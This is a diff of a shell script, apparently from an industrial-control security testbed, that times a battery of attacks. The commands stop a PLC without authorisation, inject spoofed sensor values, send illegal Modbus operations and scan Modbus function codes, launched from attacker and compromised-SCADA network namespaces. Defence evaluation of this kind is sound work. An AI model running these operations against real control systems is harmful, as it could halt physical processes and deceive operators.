@@ -23,18 +23,19 @@ run_round(){
   # 4) engineering PLC-STOP job (kill switch) from the unregistered host
   measure_attack unauth_stop "$IP_ATK" "$NS_ATK" \
     sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --stop; sleep "$GAP"
-  # 5) Modbus write attack on the LOW asset
-  measure_attack modbus_write "$IP_ATK" "$NS_ATK" \
-    sudo ip netns exec "$NS_ATK" python3 "$MBATK" --host "$MODBUS" --attack write --count 3; sleep "$GAP"
+  # 5) forbidden Modbus op on the LOW asset from the COMPROMISED-BUT-ALLOWLISTED SCADA
+  #    (the unregistered vantage is segmented off the Modbus unit, so this is the realistic path)
+  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_illegal "$IP_OP" "$NS_OP" \
+    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack illegal --count 3; sleep "$GAP"
   # 6) false-data injection from the COMPROMISED-BUT-ALLOWLISTED supervisory host (first-packet case)
   measure_attack fdi_scada "$IP_OP" "$NS_OP" \
     sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 20 --secs 3 --hz 20; sleep "$GAP"
   # 7) sensor-spoof-high from the allowlisted host (reported-full deception)
   measure_attack fdi_high "$IP_OP" "$NS_OP" \
     sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 90 --secs 3 --hz 20; sleep "$GAP"
-  # 8) out-of-state / forged traffic from the unregistered host (Modbus scan as a stand-in probe)
-  measure_attack recon_scan "$IP_ATK" "$NS_ATK" \
-    sudo ip netns exec "$NS_ATK" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
+  # 8) Modbus function-code enumeration (scan) from the compromised SCADA vantage
+  MEAS_TGT="$MODBUS" MEAS_LEAK=0 measure_attack modbus_scan "$IP_OP" "$NS_OP" \
+    sudo ip netns exec "$NS_OP" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
 }
 
 log "attack battery: $ROUNDS round(s), 8 vectors each"
